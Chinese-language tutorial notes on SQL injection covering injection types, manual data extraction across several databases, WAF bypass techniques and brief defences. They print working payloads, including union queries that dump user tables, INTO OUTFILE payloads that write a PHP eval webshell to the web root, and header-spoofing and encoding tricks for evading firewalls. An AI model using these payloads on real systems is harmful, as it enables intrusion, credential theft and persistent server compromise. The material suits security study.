# SQL注入

**SQL注入通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令**

**通过操作输入来修改后台SQL语句达到代码执行进行攻击目的**



# SQL注入产生原理

- 对用户输入的参数没有进行严格过滤(单双引号，尖括号等),就被带到数据执行，造成SQL注入
- 使用了字符串拼接的方式构造SQL语句
- 未对用户可控参数进行过滤



# SQL注入原理

**通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令**





# SQL注入的危害

- 数据库信息泄露，获取，修改敏感数据：数据库中存放的用户隐私数据(账户密码等)
- 绕过登录验证：使用万能密码登录网站后台等
- 文件系统操作：目录读取，写入文件等
- 网页纂改：通过操作数据库对特定网页进行纂改，嵌入网马链接，进行挂马攻击
- 注册表操作：读取，写入，删除注册表等
- 执行系统命令：远程执行代码
- 服务器被远程控制：种植木马，修改或操作系统等
- 删库跑路等







# SQL注入的分类

- 注入手法分类：联合查询注入，报错型注入，布尔型注入，延时注入，堆叠注入

- 数据类型分类：字符型(输入的符号进行过滤)，数值型

- 注入位置分类：

  GET数据(提交数据方式为get，大多存在地址栏)

  post数据(提交方式为post，大多存在输入框)

  http头部(提交数据方式为http头部)，

  cookie数据(提交数据方式为cookie)



# SQL注入思路

- 爆字段    order by 
- 爆出当前网页的数据库名称-1 union select 1,database(),3
- 爆表：-1 union select 1,group_concat(table_name),3from information_schema.tables table_schema=‘xxx’#数据库名称
- 爆列：-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=‘dwvs’ and table_name=‘xxx’#列名
- 爆数据：-1 union select 1,flag,3 from dwvs.flag#

**常用参数**

**information_schema.tables：记录所有表名信息的表**

**information_schema.columns：记录所有列名信息的表**

**table_name：表名**

**column_name：列名**

**tables_schema：数据库名**

**user()：查看当前mysql登录的用户名**

**databses()：查看当前使用mysql的数据库名**

**version：查看当前mysql版本信息**



# 判断注入点

**在疑似注入点的地方或者参数后面尝试提交数据，从而进行判断是否存在SQL注入漏洞**

| 测试数据           | 测试判断                                                     | 攻击思路 |
| ------------------ | ------------------------------------------------------------ | -------- |
| -1或+1             | 是否能够回显上一个或下一个页面(判断是否有回显)               | 联合注入 |
| '  或  "           | 是否显示数据库错误信息，回显的页面是否不同(字符型还是数值型) | 报错注入 |
| and 1=1或 and 1 =2 | 回显的页面是否不同(判断页面是否有布尔类型的状态)             | 布尔盲注 |
| and slepp(5)       | 判断页面的返回时间                                           | 延时注入 |
| \                  | 判断是否转义                                                 |          |



## 单引号判断法

**单引号判断法，在输入的参数中添加引号，因为无论是字符型还是整形输入都会由于多了单引号而导致最后拼接的sql语句单引号个数不匹配而报错**



## GET注入

```
# get请求参数是拼接在url后面

GET http://x.xxx.xxx.xxx:8080/sqli_1.php?title=1 union select 1,user,version(),4,host,6,7 from mysql.user limit 2,3 -- &action=search HTTP/1.1

title=1 union select 1,user,version(),4,host,6,7 from mysql.user limit 2,3 -- &action=search HTTP/1.1

Host: x.xxx.xxx.xxx:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://8.142.109.131:8080/sqli_1.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```







## POST注入

```
# post请求参数是放在请求的body中进行传递

POST http://x.xxx.xxx.xxx:8080/sqli_13.php HTTP/1.1
Host: x.xxx.xxx.xxx:8080
Connection: keep-alive
Content-Length: 17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://8.142.109.131:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://8.142.109.131:8080/sqli_13.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

​
movie=1 union select 1,user,version(),4,host,6,7 from mysql.user limit 2,3 --&action=go
```





## HTTP头注入

**HTTP头注入是利用应用程序直接使用请求头数据与数据库进行交互而没有做任何过滤而导致的SQL注入**

```
-- 例如应用程序有时候会记录客户端的类型

GET http://x.xxx.xxx.xxx:8080/sqli_1.php?title=1&action=search HTTP/1.1
Host: x.xxx.xxx.xxx:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://8.142.109.131:8080/sqli_1.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
​
​
-- 正常情况下应用程序会取出User-Agent值直接插入到数据库中

insert into tables(x1,x2,x3,x4) values(xx,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36')
​
-- 修改User-Agent的值使其成为SQL语句的一部分就能达到注入的目的
GET http://x.xxx.xxx.xxx:8080/sqli_1.php?title=1&action=search HTTP/1.1
Host: x.xxx.xxx.xxx:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: select database()
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://8.142.109.131:8080/sqli_1.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
-- SQL语句变为
insert into tables(x1,x2,x3,x4) values(xx,select database())
-- 注入就可使用前端提供的能查询这个数据的功能就能知道数据名称
```



**从传递参数数据类的角度分析SQL注入分为字符型注入和整形注入，分类依据是根据注入点的参数传到后端拼接的到SQL语句是整形还是字符型**

**进行漏洞分析时需要先判断注入点是字符型还是整形，以便构造输入时候完成sql语句的闭合**



## 整形注入

**类似结构http://xxx.com/users.php?id=1基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点id类型为数字，在大多数的网页中，诸如查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。 这一类的SQL语句原型大概为select * from表名where id=1若存在注入，我们可以构造出类似与如下的sq|注入语句进行爆破:**

```mysql
select * from 表名 where id=1 and 1=1

-- 构造注入语句时可以输入 1 or 1 = 1 和 1 and 1=2 进行判断
```





## 字符型注入

类似结构http://xxx.com/users.php?name= admin这种形式，其注入点name类型为字符类型，所以叫字符型注入点。这一-类的SQL语句原型大概为selet” from表名where name=admin'值得注看的是这里相比于数字型注入类型的sq语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破:

```mysql
select * from 表名 where name='name' and 1=1'
-- 构造注入语句时可以输入 1' or 1=1  和 1' and 1=2  进行判断
```





## 布尔型注入

**布尔型注入指的是通过联合一个布尔类型的判断完成注入目的的注入类型**

```mysql
-- 使用布尔类型注入缺点数据库版本 猜对了才会返回正常的查询数据


http://test.com/get?id=1 and substring(version(),1,1) =5
```





## 联合查询注入

**联合查询注入是指注入点可以使用union字段完成注入目的的注入类型，前提是查询有返回数据给前端**

```mysql
-- 使用union联合查询注入获取数据库表结构

									   数据库名			表名		  列名
http://test.com/get?id=1 union select tables_schema,table_name,colum_name,privileges from
记录所有列名信息的表
information_schema.columns where tables_schema = 'mysql' and table_name = 'user'
```





## 延迟注入

**基于时间延迟的注入通过联合一个SQL的sleep函数来完成注入目的的注入类型，当请求后返回时就应当使用时间盲注的方式，通过执行时间来判断注入是否发生**

```mysql
select * from tables where id =1 and sleep(4)
```





## 报错型注入

**报错型注入式通过数据自带函数的自身的问题结合数据库的额外报错信息完成注入目的的注入类型**

------



# Mysql注入

- **在mysql5.0以上版本中，mysql存在一个自带数据库名为information_schema，他说存储记录所有的数据库名称，表名，列名的数据库，相当于可以通过查询他获取指定数据库下面的表名或者列名信**息
- **数据库中符号 ”  .   “ 代表下一级，如xiaodi.user表示xiaodi数据库下的user表名**

**常用参数**

**information_schema.tables：记录所有表名信息的表**

**information_schema.columns：记录所有列名信息的表**

**table_name：表名**

**column_name：列名**

**tables_schema：数据库名**

**user()：查看当前mysql登录的用户名**

**databses()：查看当前使用mysql的数据库名**

**version：查看当前mysql版本信息**



![img](https://cdn.nlark.com/yuque/0/2021/png/1272951/1621318387933-023cfd3a-1af4-46c6-9d65-12841332ef89.png?x-oss-process=image%2Fresize%2Cw_1154%2Fresize%2Cw_1145%2Climit_0)![img](https://cdn.nlark.com/yuque/0/2021/png/1272951/1621405493318-f8a180c6-8b51-4ff6-8ae6-30ab8b9de48a.png?x-oss-process=image%2Fresize%2Cw_1102%2Fresize%2Cw_1102%2Climit_0)





## 高权限注入以及低权限注入

### 跨库查询及思路

**information_schema 表特性，记录库名，表名列名对应表**

通过select * from schemata 进行数据库名查询，再去选择进行查询获取指明数据量里的数据

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627616168321-08005f4e-d1ef-47c1-b3b9-091a512acfee.png?x-oss-process=image%2Fresize%2Cw_767%2Climit_0)



## 文件读写操作

[文件读写](https://blog.csdn.net/weixin_30292843/article/details/99381669)

**可以利用SQL 注入漏洞进行文件读写**

**数据库支持文件读写**

**涉及到1个变量`secure_file_priv`，该参数在高版本的 mysql 数据库中限制了文件的导入导出操作。若要配置此参数，需要修改 my.ini 配置文件，并重启 mysql 服务【其在Phpstudy中默认是NULL，不允许读写文件】**



![在这里插入图片描述](https://img-blog.csdnimg.cn/d10cd24f668b41bda4f79704f6d3eb6a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)



| 参数                     | 含义                                                        |
| ------------------------ | ----------------------------------------------------------- |
| secure_file_priv=NULL    | 限制mysqld 不允许导入导出操作                               |
| secure_file_priv=‘c:/a/’ | 会限制mysqld 的导入导出操作在某个固定目录下，并且子目录有效 |
| secure_file_priv=        | 不对mysqld 的导入导出操作做限制                             |

**修改配置文件，对读写不做限制，文件路径`C:\phpStudy\MySQL\my.ini`，该操作比较敏感，需要在mysql的配置文件中操作，在phpmyadmin网页中不能修改**

![在这里插入图片描述](https://img-blog.csdnimg.cn/a40c5b6e35c34f588ed166bbfd9bc50a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)



**常见读取文件列表：**

**常见写入文件问题：魔术引号开关/magic_quotes_gpc**

### **load_file()：读取函数**





![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627616726927-3effc583-790c-4610-94e9-05df37cb7680.png)





![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627634990125-232e8af2-33b0-4a2d-98d8-160725015464.png?x-oss-process=image%2Fresize%2Cw_1145%2Climit_0)



![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627635065072-cc02b68a-3076-425f-9d54-4e3785100807.png?x-oss-process=image%2Fresize%2Cw_1145%2Climit_0)![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627635073425-8cc4b09e-9838-496c-b9b9-411cacc59e84.png)



### into outfile 或 into dumpfile：导出函数

**写16进制是直接写，写明文的话，需要用引号给包住**

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627616809122-3b0b299c-9852-4052-b035-2a500d1e4dac.png)

将x写入www文件中

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627635595594-31d5d1ad-9831-47cc-b51d-78972631e8eb.png?x-oss-process=image%2Fresize%2Cw_1145%2Climit_0)

**使用 --+注释掉limint**



写phpinfo 没有报错说明写入成功，可以直接访问写入的文件地址

```
# 1. 直接写
?id=-1' union select 1,'<?php phpinfo();?>',3 into outfile 'c:\\phpstudy\\www\\hack.php'--+
# 2. 改写成16进制
?id=1' and 1=2 union select 1,0x3c3f70687020706870696e666f28293b3f3e,3 into outfile 'c:/phpstudy/www/hack.php' --+

```





写一句话木马

```
# 1. 直接写
?id=1' and 1=2 union select 1,'<?=@eval($_REQUEST[404])?>',3 into outfile 'c:/phpstudy/www/hack1.php' --+

# 2. 改写成16进制
?id=1' and 1=2 union select 1,0x3c3f3d406576616c28245f524551554553545b3430345d293f3e,3 into outfile 'c:/phpstudy/www/hack1.php' --+

```



------



## 获取网站路径常见方式

### 报错显示

**一般网站出现错误的时候他会泄露出路径**![在这里插入图片描述](https://img-blog.csdnimg.cn/81396813197d476a9daf49d70d4aebb2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627618086104-ba552c00-cb50-4079-a4af-65d8eb2fb2b4.png?x-oss-process=image%2Fresize%2Cw_1115%2Climit_0)

### 遗留文件

**站长为了调试信息的时候遗留的文件而泄露的路径，用扫描工具可以扫出**

![在这里插入图片描述](https://img-blog.csdnimg.cn/71a656e3502842de99288ae7eed2ad0d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627634449104-71a3c193-9745-4c4a-873c-004660654aa6.png?x-oss-process=image%2Fresize%2Cw_912%2Climit_0)







### 漏洞报错

**知道对方是用什么程序搭建再去网上搜漏洞信息**：phpcms  爆路径

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627634644156-a862b3b2-ef69-4336-b611-1762358aa0d2.png?x-oss-process=image%2Fresize%2Cw_890%2Climit_0)









### 平台配置文件

**通过读取文件来读取搭建网站平台的配置文件**

**缺点：路径不是默认的，一旦更改很难找到路径**

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627634751427-49e41baf-10e0-4550-8769-24999eac6c36.png)



## 魔术引号及常见防护

**编码或宽字节绕过：**

**在sqlmap中添加 --temper脚本参数转码**

**或者使用转换工具转码**



![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627455970060-a20d300f-d496-49f8-b760-ad7612139fa6.png)



### 防护

- **自带防御：魔术引号**
- **内置函数：is_int**

![img](https://cdn.nlark.com/yuque/0/2021/png/1272951/1621424370487-b9cab991-830d-4a72-9f85-b07b89919ec0.png?x-oss-process=image%2Fresize%2Cw_1102%2Fresize%2Cw_1102%2Climit_0)



### 自定义关键字：select等

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627638838442-b9c0b9ed-f21f-4be9-bfd3-68cb9fb1f7d3.png)



**将select过滤成fuck**



------



# 简要明确请求方式

1. **根据网站的情况来获取相应的请求方式从而找到注入点，请求方式可以通过网站抓包的前缀查看，找到requests headers(请求头)**

2. **不同的请求方式，它请求的数据类型或大小都不同，一般大数据会采用post方式提交。注入的时候按照网站的请求方式去注入**

3. GET，POST，COOKIE，HTTP头等

   ​			A  .   get产生一个tcp数据包，post产生两个tcp数据包

   ​			对于get方式的请求，浏览器会把http headers和data一起发送出去，服务器响应200

   ​			对于post，浏览器先发送header 服务器响应100 continue 浏览器再发送data 服务器响应200

   ​			B   .  get方法无法接受post的值

   ​			在post情况下get的值只要在网址后面就能接收

   ​			get，post接收单个

   ​			**request 全部接收，如果对方采用request的接收方法，就不要考虑用何种方式去提交，因为get，post都可以，如果对方是单一接收方式，那么注入的时候就要按照他的方法去注入**

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627874896946-2e21f4ea-a1d9-4e09-9a24-12bef165f2e5.png?x-oss-process=image%2Fresize%2Cw_875%2Climit_0)

**如图：get方式提交请求将参数给post也能提交**



**以post请求去测试网页，网页界面是一样的，那么这两个参数均以post方式去提交**

![img](https://cdn.nlark.com/yuque/0/2021/png/1272951/1621510590944-8a0b6fa9-2e3b-4c95-a0b6-c5ffd0552172.png?x-oss-process=image%2Fresize%2Cw_1271%2Fresize%2Cw_847%2Climit_0)

![img](https://cdn.nlark.com/yuque/0/2021/png/1272951/1621511550800-9fcd70be-f289-4a3c-a419-c25684420379.png?x-oss-process=image%2Fresize%2Cw_1270%2Fresize%2Cw_875%2Climit_0&date=1627702320337)

**能用get方式提交也能使用post方式提交**





**$_SERVER是PHP里内置变量，全局变量，PHP写脚本时用它来获取系统的值，在数据包的某一个地方可以进行注入**



![img](https://cdn.nlark.com/yuque/0/2021/png/1272951/1621511791809-a86bf944-8d69-4a37-a715-8065839417b0.png?x-oss-process=image%2Fresize%2Cw_502%2Climit_0)

[超链接](https://blog.csdn.net/demon0313/article/details/45566527)

------





# 各数据库手工注入

## MySQL

- 找到注入点   and 1=1 and 1=2 测试报错

- order by  #到5的时候就报错，获取字段总数为4

- id = 0 (不是1就行，强行报错) union select 1,2,3,4 #联合查询，2和3可以显示信息

- 获取数据库信息

  user() ===>root      /查看数据库用户

  database() ==>mozhe_Discuz_StormGroup    /查看数据库名称

  version() ==>5.7.22-ubantu0.16.04    / 查看数据库版本

- 获取数据表

  table_name    /表名

  information_schema.tables  /   生产信息表

  table_schema   /数据库名16进制或单引号括起来

  改变limit 0 ，1 中前一个参数，得到两个表 Stormgroup_member notice

- 获取列名

  结果如下：id，name，password，status

- 脱裤



------





## Access

- and 1=2   /报错找到注入点
- order by /获取总字段
- 猜解表名   and exists(select *from admin )页面返回正常，说明存在admin表
- 猜解列名  and exists(select id from admin)页面返回正常，说明admin表中存在id列，username，passwd同样存在
- 脱裤  union select 1,username,passwd,4 from admin









## MSSQL

- and 1=2     /报错

- order by N  /获取总字段

- 猜表名 `and exists(select * from manage)` 表名manage存在

- 猜解列名 `and exists(select id from manage)` 列名id存在，同样username,password也存在

- 脱裤 `and exists (select id from manage where id=1 )` 证明id=1存在

  `and exists (select id from manage where%20 len(username)=8 and id=1 )` 猜解username字段长度为8

  `and exists (select id from manage where%20 len(password)=16 and id=1 )` 猜解password字段长度为16

  可用Burp的Intruder功能辅助猜解

  猜解username第1到8位的字符，ASCII转码 admin_mz

  猜解password第1到16位的字符，ASCII转码(Burp 爆破)

  转ASCII的py脚本：

  72e1bfc3f01b7583 MD5解密为97285101



## SQLite

- 找注入点 and 1=1

- order by N 猜字段 4

- 猜数据库

  offset == > 0~2

  有三个数据库

  WSTMart_reg

  notice_sybase

  sqlite_sequence

- 猜列

  共有三个字段

  id，name，passwd

- 脱裤







## MongoDB

- id=1′ 单引号注入报错

- 闭合语句，查看所有集合

- 查看指定集合的数据

  [0]代表第一条数据，可递增



## DB2

- and 1=2 判断注入点

- order by N 获取字段数

- 爆当前数据库

  GAME_CHARACTER

- 列表

  NAME

- 脱裤

  



## PostgreSQL



1.and 1=2 判断注入点

2.order by N 获取字段

3.爆数据库

4.列表

5.列字段

6.拖库





## Sybase

1.and 1=2 判断注入点

2.order by N 获取总字段

3.爆数据库

4.列表

5.列字段

6.查状态

结果为：zhang

7.反选爆用户名

结果为：mozhe

8.猜解密码











## Oracle

1.and 1=1

2.order by

3.爆数据库

4.列表

5.列字段

6.拖库

加上状态：1 where STATUS=1





![注入总结.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1627961227281-75a376a1-cecf-4a47-92bd-1a7fbdf2d46e.png?x-oss-process=image%2Fresize%2Cw_875%2Climit_0)



------





# 查询方式及报错盲注

**进行SQL注入时，有很多注入无回显的情况，不回显的原因可能是SQL语句查询方式的问题导致，这个时候需要用到相关报错或盲注进行操作，作为手工注入时，提前了解SQL语句大概写法能更好的选择对应的注入语句**



## select 查询数据

在网站中进行数据查询显示查询效果

**例如：select * from news where id=$id**





## insert 插入数据

在网站中进行用户注册添加等操作

**例如：insert into nets(name,age,text) value(2,'李环','$t')**





## updata 更新数据

会员或后台中心数据同步或缓存等操作

**例如：update user set pwd='$p' where id=2 and username='admin'**





## delete  删除数据

后台管理里面删除文章删除用户等操作

**例如：delete from news where id=$id**







## order by 排列数据

一般结合表名或列名进行数据排序操作

**例：select * from news order by $id**

**例：select id,name,price from news order by $order**





**可以通过以上查询方式与网站应用的关系**

**注入点产生地方或应用猜测到对方的SQL查询方式**





------



# 堆叠查询注入

定义

Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实

的运用中也是这样的,我们知道在mysql中,主要是命令行中,每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stackedinjection。

原理

在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。

例如：

```mysql
select * from users;select * from password;
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1628821533033-96d72640-3c72-4434-ba46-45052baf3ddf.png)



**局限性**

**堆叠性注入局限性并不是每一个环境都可以执行，可能受到api或者数据库引擎不支持的限制，权限不足也可以解释为什么攻击无法修改数据或调用一些程序**





------



# WAF绕过注入

现在网站为了加强自身安全，通常都会安装各类防火墙。这些防火墙往往会拦截各种扫描 请求，使得测试人员无法正确判断网站相关信息。Kali Linux 提供了一款网站防火墙探测工具 Wafw00f。它可以通过发送正常和带恶意代码的 HTTP 请求，以探测网站是否存在防火墙，并识别防火墙的类型。

WAFW00F 怎么工作

1. 1. 发送正常的 HTTP 请求，然后分析响应，这可以识别出很多 WAF。 
   2. 如果不成功，它会发送一些（可能是恶意的）HTTP 请求，使用简单的逻辑推断是哪一 个 WAF。 
   3. 如果这也不成功，它会分析之前返回的响应，使用其它简单的算法猜测是否有某个 WAF 或者安全解决方案响应了我们的攻击



**kali中有自带的waf扫描工具，可以查询该网站有没有开启waf**

命令：wafw00f 域名/IP

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1626278904536-f9a72b02-0c83-4e4f-9500-34fb8ce2af40.png?x-oss-process=image%2Fresize%2Cw_611%2Climit_0)





## WAF绕过思路

### 大小写/关键字替换

id=1UnIoN/**/SeLeCT1,user()

Hex() bin() 等价于 ascii()

Sleep() 等价于 benchmark()

Mid() substring() 等价于substr()

@@user 等价于 User()

@@Version 等价于 version()





### 各种编码

大小写，URL，hex，%0A等





### 注释使用

//----+#//+:%00/!/等





### 再次循环

union==uunionnion







### 等价替换

user()=@@user()and=&or=|ascii=hex等



### 参数污染

?id=1&id=2&id=3



### 编码解码及加密解密

s->%73->%25%37%33

hex,unlcode,base64等



### 更改请求提交方式

GET POST COOKIE等

POST->multipart/form-data





### 白名单绕过

通过对网站IP的伪造，知道对方网站ip地址，那就默认为ip地址为白名单。

从网络层获取的ip一般伪造不来。如果是获取客户端的ip，那么可能存在伪造ip绕过的情况

测试方法：修改http的headers头来pass waf

X-forwarded-for

X-remote-IP

X-remote-addr

X-Real-IP





### 静态资源

特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。

[http://127.0.0.1/sql.php?id=1](http://10.9.9.201/sql.php?id=1)

[http://127.0.0.1/sql.php/1.js?id=1](http://10.9.9.201/sql.php/1.js?id=1)

备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。



UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。

User Agent Switcher (firefox 附加组件)，下载地址：

https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/

伪造成百度爬虫    

![img](https://cdn.nlark.com/yuque/0/2021/png/1272951/1622000397109-7e317ba7-ff18-40f2-92a9-11d21807b28a.png?x-oss-process=image%2Fresize%2Cw_1115%2Climit_0)





使用伪装脚本进行爬取，发现网站是没有任何拦截的。返回200是存在的，404不存在  

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1628910837633-f7bbf2ff-f74a-4f29-9c47-3d5763555675.png?x-oss-process=image%2Fresize%2Cw_1115%2Climit_0)









## WAF绕过-数据库特性

（1）mysql注释符有三种：#、/*...*/、--...(注意--后面有一个空格，或者为--+)

（2）空格符:[0x09,0x0a-0x0d,0x20,0xa0]

（3）特殊符号：%a换行符

可结合注释符使用%23%0a，%2d%2d%0a。

（3）内联注释：

/*!UnIon12345SelEcT*/1,user()//数字范围1000-50540

（4）mysql黑魔法

select{xusername}from{x11test.admin};

2、SQLServer技巧

（1）用来注释掉注射后查询的其余部分：

/*C语言风格注释

SQL注释

;00％空字节

（2）空白符：[0x01-0x20]

（3）特殊符号：%3a冒号

id=1union:select1,2from:admin

（4）函数变形：如db_name 空白字符

3、Oracle技巧

（1）注释符：--、/**/

（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]

4.配合FUZZ（[SQLI FUZZ字典](https://blog.csdn.net/weixin_44364851/article/details/111401383?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-15.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-15.control)，[SQL注入过滤关键字的Fuzz字典](https://mochu.blog.csdn.net/article/details/109526779?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control)）

就是模糊测试，批量测试

select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin





## WAF绕过-逻辑层

1、逻辑问题

（1）云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。

（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。

（3）HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP

没有防护，直接访问HTTP站点绕过防护。

（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数

输入，从而导致Bypass。比如：id=1 %00 and 1=2 union select 1,2,column_name from information_schema.columns

2、性能问题

猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只

要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。

猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向

量时超出了其缓冲区长度就会引发bug，从而实现绕过。

例子1：

?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9

PS：0xA*1000指0xA后面”A"重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。

例子2：

?a0=0&a1=1&.....&a100=100&id=1

union

select

1,schema_name,3

from

INFORMATION_SCHEMA.schemata

备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。

3、白名单

方式一：IP白名单

从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情

况。

测试方法：修改http的header来bypasswaf

X-forwarded-for

X-remote-IP

X-originating-IP

x-remote-addr

X-Real-ip

方式二：静态资源

特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测

效率，不去检测这样一些静态文件名后缀的请求。

http://10.9.9.201/sql.php?id=1

http://10.9.9.201/sql.php/1.js?id=1

备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别

方式三：url白名单

为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url

中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势









# SQL注入的防范

　**1、定制黑白名单：将常用请求定制为白名单，一些攻击频繁的攻击限制其为黑名单，可以通过服务器安全狗进行实现，服务器安全狗可以针对攻击类型把对方ip进行封禁处理，也可也对常用ip进行加白名单。**
　　**2、限制查询长度和类型：由于SQL注入过程中需要构造较长的SQL语句，同时有些不常用的查询类型我们可以进行限制，凡是不符合该类请求的都归结于非法请求予以限制。**
　　**3、数据库用户的权限配置：根据程序要求为特定的表设置特定的权限，如：某段程序对某表只需具备select权限即可，这样即使程序存在问题，恶意用户也无法对表进行update或insert等写入操作。**
　　**4、限制目录权限：务器管理员还应在IIS中为每个网站设置好执行权限，WEB目录应至少遵循“可写目录不可执行，可执行目录不可写”的原则，在次基础上，对各目录进行必要的权限细化。**





- **对用户的输入进行校验，过滤转换等**
- **不要使用动态拼接SQL语句**
- **过滤特殊符号，字符**

